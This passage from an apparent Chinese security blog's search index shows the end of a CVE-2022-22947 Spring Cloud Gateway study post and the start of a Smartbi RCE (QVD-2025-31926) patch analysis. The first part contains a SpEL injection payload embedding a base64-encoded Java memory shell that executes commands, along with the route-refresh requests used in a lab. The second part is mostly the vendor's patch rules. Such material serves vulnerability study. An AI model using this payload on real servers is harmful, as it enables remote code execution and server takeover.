\u0026#34;filters\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;RewritePath\u0026#34;, \u0026#34;args\u0026#34;: { \u0026#34;_genkey_0\u0026#34;: \u0026#34;#{T(org.springframework.cglib.core.ReflectUtils).defineClass(\u0026#39;SpringRequestMappingMemshell\u0026#39;,T(org.springframework.util.Base64Utils).decodeFromString(\u0026#39;yv66vgAAADQAiwoABgBICABJCgAGAEoIADAHAEsHAEwHAE0HAE4KAAUATwoABwBQBwBRCAAyBwBSBwBTCgAOAEgIAFQKAA4AVQcAVgcAVwoAEgBYCABZCgAIAFoKAAsASAoABwBbCABcBwBdCABeBwBfCgBgAGEKAGAAYgoAYwBkCgAcAGUIAGYKABwAZwoAHABoBwBpCQBqAGsKACQAbAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAeTFNwcmluZ1JlcXVlc3RNYXBwaW5nTWVtc2hlbGw7AQAIZG9JbmplY3QBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvU3RyaW5nOwEAFXJlZ2lzdGVySGFuZGxlck1ldGhvZAEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAOZXhlY3V0ZUNvbW1hbmQBAAtwYXRoUGF0dGVybgEAMkxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi91dGlsL3BhdHRlcm4vUGF0aFBhdHRlcm47AQAYcGF0dGVybnNSZXF1ZXN0Q29uZGl0aW9uAQBMTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3JlYWN0aXZlL3Jlc3VsdC9jb25kaXRpb24vUGF0dGVybnNSZXF1ZXN0Q29uZGl0aW9uOwEAEnJlcXVlc3RNYXBwaW5nSW5mbwEAQ0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbzsBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAccmVxdWVzdE1hcHBpbmdIYW5kbGVyTWFwcGluZwEAEkxqYXZhL2xhbmcvT2JqZWN0OwEAA21zZwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEADVN0YWNrTWFwVGFibGUBABBNZXRob2RQYXJhbWV0ZXJzAQA9KExqYXZhL2xhbmcvU3RyaW5nOylMb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL1Jlc3BvbnNlRW50aXR5OwEAA2NtZAEACmV4ZWNSZXN1bHQBAApFeGNlcHRpb25zBwBtAQAKU291cmNlRmlsZQEAIVNwcmluZ1JlcXVlc3RNYXBwaW5nTWVtc2hlbGwuamF2YQwAJwAoAQAMaW5qZWN0LXN0YXJ0DABuAG8BAA9qYXZhL2xhbmcvQ2xhc3MBABBqYXZhL2xhbmcvT2JqZWN0AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQBBb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvcmVhY3RpdmUvcmVzdWx0L21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8MAHAAcQwAcgBzAQAcU3ByaW5nUmVxdWVzdE1hcHBpbmdNZW1zaGVsbAEAEGphdmEvbGFuZy9TdHJpbmcBADZvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi91dGlsL3BhdHRlcm4vUGF0aFBhdHRlcm5QYXJzZXIBAAIvKgwAdAB1AQBKb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvcmVhY3RpdmUvcmVzdWx0L2NvbmRpdGlvbi9QYXR0ZXJuc1JlcXVlc3RDb25kaXRpb24BADBvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi91dGlsL3BhdHRlcm4vUGF0aFBhdHRlcm4MACcAdgEAAAwAJwB3DAB4AHkBAA5pbmplY3Qtc3VjY2VzcwEAE2phdmEvbGFuZy9FeGNlcHRpb24BAAxpbmplY3QtZXJyb3IBABFqYXZhL3V0aWwvU2Nhbm5lcgcAegwAewB8DAB9AH4HAH8MAIAAgQwAJwCCAQACXEEMAIMAhAwAhQCGAQAnb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL1Jlc3BvbnNlRW50aXR5BwCHDACIAIkMACcAigEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEABXBhcnNlAQBGKExqYXZhL2xhbmcvU3RyaW5nOylMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvdXRpbC9wYXR0ZXJuL1BhdGhQYXR0ZXJuOwEANihbTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3V0aWwvcGF0dGVybi9QYXRoUGF0dGVybjspVgECJChMamF2YS9sYW5nL1N0cmluZztMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvcmVhY3RpdmUvcmVzdWx0L2NvbmRpdGlvbi9QYXR0ZXJuc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3JlYWN0aXZlL3Jlc3VsdC9jb25kaXRpb24vUmVxdWVzdE1ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvY29uZGl0aW9uL1BhcmFtc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3JlYWN0aXZlL3Jlc3VsdC9jb25kaXRpb24vSGVhZGVyc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3JlYWN0aXZlL3Jlc3VsdC9jb25kaXRpb24vQ29uc3VtZXNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvY29uZGl0aW9uL1Byb2R1Y2VzUmVxdWVzdENvbmRpdGlvbjtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvcmVhY3RpdmUvcmVzdWx0L2NvbmRpdGlvbi9SZXF1ZXN0Q29uZGl0aW9uOylWAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEABG5leHQBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAI29yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9IdHRwU3RhdHVzAQACT0sBACVMb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL0h0dHBTdGF0dXM7AQA6KExqYXZhL2xhbmcvT2JqZWN0O0xvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvSHR0cFN0YXR1czspVgAhAAsABgAAAAAAAwABACcAKAABACkAAAAvAAEAAQAAAAUqtwABsQAAAAIAKgAAAAYAAQAAAAwAKwAAAAwAAQAAAAUALAAtAAAACQAuAC8AAgApAAABUwAKAAcAAACSEgJMKrYAAxIEBr0ABVkDEgZTWQQSB1NZBRIIU7YACU0sBLYAChILEgwEvQAFWQMSDVO2AAlOuwAOWbcADxIQtgAROgS7ABJZBL0AE1kDGQRTtwAUOgW7AAhZEhUZBQEBAQEBAbcAFjoGLCoGvQAGWQO7AAtZtwAXU1kELVNZBRkGU7YAGFcSGUynAAdNEhtMK7AAAQADAIkAjAAaAAMAKgAAADYADQAAAA4AAwAQACAAEQAlABIANgATAEQAFABWABUAaQAWAIYAFwCJABoAjAAYAI0AGQCQABsAKwAAAFIACAAgAGkAMAAxAAIANgBTADIAMQADAEQARQAzADQABABWADMANQA2AAUAaQAgADcAOAAGAI0AAwA5ADoAAgAAAJIAOwA8AAAAAwCPAD0APgABAD8AAAATAAL/AIwAAgcABgcADQABBwAaAwBAAAAABQEAOwAAAAEAMgBBAAMAKQAAAGgABAADAAAAJrsAHFm4AB0rtgAetgAftwAgEiG2ACK2ACNNuwAkWSyyACW3ACawAAAAAgAqAAAACgACAAAAHwAaACAAKwAAACAAAwAAACYALAAtAAAAAAAmAEIAPgABABoADABDAD4AAgBEAAAABAABAEUAQAAAAAUBAEIAAAABAEYAAAACAEc=\u0026#39;),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject(RequestMappingHandlerMapping)}\u0026#34;, \u0026#34;_genkey_1\u0026#34;: \u0026#34;/${path}\u0026#34; } } ], \u0026#34;uri\u0026#34;: \u0026#34;https://xvshifu.github.io/\u0026#34;, \u0026#34;order\u0026#34;: 0 } 刷新路由：\nplain\r1 2 3 4 5 POST /actuator/gateway/refresh HTTP/1.1 Host: 192.168.31.16:8080 Content-Type: application/json Connection: close Content-Length: 258 查看添加的路由：\nplain\r1 2 3 GET /actuator/gateway/routes HTTP/1.1 Host: 192.168.31.16:8080 Connection: close 尝试了很多次，但是不知道什么原因。payload 应该没有问题，就是添加不了路由。\n参考： 自带 SSRF 攻击——网关执行器\nCVE-2022-22947：Spring Cloud Gateway 代码注入漏洞\nCVE-2022-22947：SpEL 类型转换与恶意 Bean\nSpring cloud gateway通过SPEL注入内存马\n","permalink":"http://localhost:1313/xvsf/posts/cve-2022-22947spring-cloud-gateway-%E5%AD%A6%E4%B9%A0--spel-%E7%9A%84%E5%A4%9A%E7%A7%8D%E6%B3%A8%E5%85%A5/","summary":"\u003cp\u003eCVE-2022-22947 的起因是作者 \u003ca href=\"https://wya.pl/\"\u003e@Wyatt\u003c/a\u003e 在 \u003ca href=\"https://wya.pl/2021/12/20/bring-your-own-ssrf-the-gateway-actuator/\"\u003eBring Your Own SSRF – The Gateway Actuator\u003c/a\u003e 一文中提及到利用 Spring Cloud Gateway Actuator 构造 SSRF，之后该作者利用发现的暴露的 Actuator 执行器，在 \u003ca href=\"https://wya.pl/2022/02/26/cve-2022-22947-spel-casting-and-evil-beans/\"\u003eCVE-2022-22947: SpEL Casting and Evil Beans\u003c/a\u003e 中讲到： \u003ccode\u003e/actuator/gateway/routes/\u003c/code\u003e创建路由并在 \u003ccode\u003efilters\u003c/code\u003e字段插入一个 SpEL  表达式，Spring Cloud Gateway 在处理过滤器时会执行该表达式，通过构造恶意 SpEL 可实现 RCE。\u003c/p\u003e","title":"CVE-2022-22947——Spring Cloud Gateway 学习 \u0026 SpEL 的多种注入"},{"content":"Smartbi 远程代码执行漏洞复现(QVD-2025-31926)\n1、 漏洞描述 近日，奇安信CERT监测到官方修复Smartbi 远程代码执行漏洞(QVD-2025-31926)，该漏洞源于攻击者可通过默认资源ID绕过身份验证获取权限，配合后台接口实现远程代码执行，可能导致服务器被完全控制、数据泄露或业务系统沦陷。鉴于该漏洞影响范围较大，建议客户尽快做好自查及防护。\n2、影响范围 影响版本\nSmartbi \u0026lt;= 11.0.99471.25193\n3、补丁分析 官网发布了新的补丁，我们可以从补丁入手，看他修复了什么\nhttps://www.smartbi.com.cn/patchinfo\n下载到的补丁是经过加密的\n具体解密方法可参考：\nSmartbi 最新认证绕过导致RCE漏洞分析\n解密\n下载为 jar 包：\n7-31 的补丁内容：\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 311 312 313 314 315 316 317 318 319 320 321 322 323 324 325 326 327 328 329 330 331 332 333 334 335 336 337 338 339 340 341 342 343 344 345 346 347 348 349 350 351 352 353 354 355 356 357 358 359 360 361 362 363 364 365 366 367 368 369 370 { \u0026#34;version\u0026#34;: \u0026#34;1.0\u0026#34;, \u0026#34;date\u0026#34;: \u0026#34;2025-07-31 09:00:00\u0026#34;, \u0026#34;patches\u0026#34;: { \u0026#34;PATCH_20250731\u0026#34;: { \u0026#34;desc\u0026#34;: \u0026#34;强化系统安全性，防范特定条件下的非授权访问5 (Patch.20250731 @2025-07-31)\u0026#34;, \u0026#34;desc_zh_TW\u0026#34;: \u0026#34;強化系統安全性，防範特定條件下的非授權訪問5 (Patch.20250731 @2025-07-31)\u0026#34;, \u0026#34;desc_en\u0026#34;: \u0026#34;Strengthen system security against unauthorized access under certain conditions 5 (Patch.20250731 @2025-07-31)\u0026#34;, \u0026#34;urls\u0026#34;: [ { \u0026#34;url\u0026#34;: \u0026#34;/vision/share.jsp\u0026#34;, \u0026#34;rules\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;ShareRecordPatchRule\u0026#34;, } ] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/agentEngineMonitor/*\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_MINING,MANAGE_ETL,AUGMENTED_DATASET_ETL\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/customextension/customsqlnode/nodedefine\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_MINING,MANAGE_ETL\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/datamining/config/infos\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_MINING,MANAGE_ETL,AUGMENTED_DATASET_ETL,MANAGE_TOOLKIT_SYSMONITOR\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/datamining/config/service/infos\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_MINING,MANAGE_ETL,AUGMENTED_DATASET_ETL,MANAGE_TOOLKIT_SYSMONITOR\u0026#34; }] },{ \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/datamining/config/system/infos\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_MINING,MANAGE_ETL,AUGMENTED_DATASET_ETL,MANAGE_TOOLKIT_SYSMONITOR\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/datamining/customExtensionNode/java/upload\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_MINING,MANAGE_ETL,AUGMENTED_DATASET_ETL,MANAGE_TOOLKIT_SYSMONITOR\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/datamining/customExtensionNode/python/upload\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_MINING,MANAGE_ETL,AUGMENTED_DATASET_ETL,MANAGE_TOOLKIT_SYSMONITOR\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/datamining/customtree/type/*\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_MINING,MANAGE_ETL,AUGMENTED_DATASET_ETL,MANAGE_TOOLKIT_SYSMONITOR\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/datamining/customnodehelp/update/*\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_MINING,MANAGE_ETL,AUGMENTED_DATASET_ETL,MANAGE_TOOLKIT_SYSMONITOR\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/datamining/bind/mining/secret\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_MINING,MANAGE_ETL,AUGMENTED_DATASET_ETL\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/engineMonitor/*\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_MINING,MANAGE_ETL,AUGMENTED_DATASET_ETL,MANAGE_TOOLKIT_SYSMONITOR\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/engineMonitor/engineLog/*\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_MINING,MANAGE_ETL,AUGMENTED_DATASET_ETL,MANAGE_TOOLKIT_SYSMONITOR\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/engineMonitor/engineMethod/*\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_MINING,MANAGE_ETL,AUGMENTED_DATASET_ETL,MANAGE_TOOLKIT_SYSMONITOR\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/engineMonitor/restartComputeNode/*\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_MINING,MANAGE_ETL,AUGMENTED_DATASET_ETL,MANAGE_TOOLKIT_SYSMONITOR\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/engineMonitor/agentsystem/*\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_MINING,MANAGE_ETL,AUGMENTED_DATASET_ETL,MANAGE_TOOLKIT_SYSMONITOR\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/engineMonitor/agentLog/*\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_MINING,MANAGE_ETL,AUGMENTED_DATASET_ETL,MANAGE_TOOLKIT_SYSMONITOR\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/serveMonitor/serviceMethod/*\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_MINING,MANAGE_ETL,AUGMENTED_DATASET_ETL,MANAGE_TOOLKIT_SYSMONITOR\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/serveMonitor/serviceServers/*\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_MINING,MANAGE_ETL,AUGMENTED_DATASET_ETL,MANAGE_TOOLKIT_SYSMONITOR\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/serveMonitor/serviceLog/*\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_MINING,MANAGE_ETL,AUGMENTED_DATASET_ETL,MANAGE_TOOLKIT_SYSMONITOR\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/sparkUiMonitor/checkStart\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_MINING,MANAGE_ETL,AUGMENTED_DATASET_ETL,MANAGE_TOOLKIT_SYSMONITOR\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/sparkUiMonitor/jobs\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_MINING,MANAGE_ETL,AUGMENTED_DATASET_ETL,MANAGE_TOOLKIT_SYSMONITOR\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/sparkUiMonitor/jobs/job\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_MINING,MANAGE_ETL,AUGMENTED_DATASET_ETL,MANAGE_TOOLKIT_SYSMONITOR\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/sparkUiMonitor/jobs/job/kill\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_MINING,MANAGE_ETL,AUGMENTED_DATASET_ETL,MANAGE_TOOLKIT_SYSMONITOR\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/sparkUiMonitor/stages\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_MINING,MANAGE_ETL,AUGMENTED_DATASET_ETL,MANAGE_TOOLKIT_SYSMONITOR\u0026#34; }] },{ \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/sparkUiMonitor/stages/stage\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_MINING,MANAGE_ETL,AUGMENTED_DATASET_ETL,MANAGE_TOOLKIT_SYSMONITOR\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/sparkUiMonitor/stages/pool\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_MINING,MANAGE_ETL,AUGMENTED_DATASET_ETL,MANAGE_TOOLKIT_SYSMONITOR\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/sparkUiMonitor/storage\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_MINING,MANAGE_ETL,AUGMENTED_DATASET_ETL,MANAGE_TOOLKIT_SYSMONITOR\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/sparkUiMonitor/storage/rdd\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_MINING,MANAGE_ETL,AUGMENTED_DATASET_ETL,MANAGE_TOOLKIT_SYSMONITOR\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/sparkUiMonitor/environment\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_MINING,MANAGE_ETL,AUGMENTED_DATASET_ETL,MANAGE_TOOLKIT_SYSMONITOR\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/sparkUiMonitor/executors\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_MINING,MANAGE_ETL,AUGMENTED_DATASET_ETL,MANAGE_TOOLKIT_SYSMONITOR\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/sparkUiMonitor/executors/threadDump\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_MINING,MANAGE_ETL,AUGMENTED_DATASET_ETL,MANAGE_TOOLKIT_SYSMONITOR\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/sparkUiMonitor/SQL\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_MINING,MANAGE_ETL,AUGMENTED_DATASET_ETL,MANAGE_TOOLKIT_SYSMONITOR\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/sparkUiMonitor/SQL/execution\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_MINING,MANAGE_ETL,AUGMENTED_DATASET_ETL,MANAGE_TOOLKIT_SYSMONITOR\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/sparkUiMonitor/logPage\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_MINING,MANAGE_ETL,AUGMENTED_DATASET_ETL,MANAGE_TOOLKIT_SYSMONITOR\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/sparkUiMonitor/applications\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_MINING,MANAGE_ETL,AUGMENTED_DATASET_ETL,MANAGE_TOOLKIT_SYSMONITOR\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/sparkUiMonitor/api/v1/applications/*\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_MINING,MANAGE_ETL,AUGMENTED_DATASET_ETL,MANAGE_TOOLKIT_SYSMONITOR\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/sparkUiMonitor/executorspage\u0026#34;, \u0026#34;rules\u0026#34;: [{ 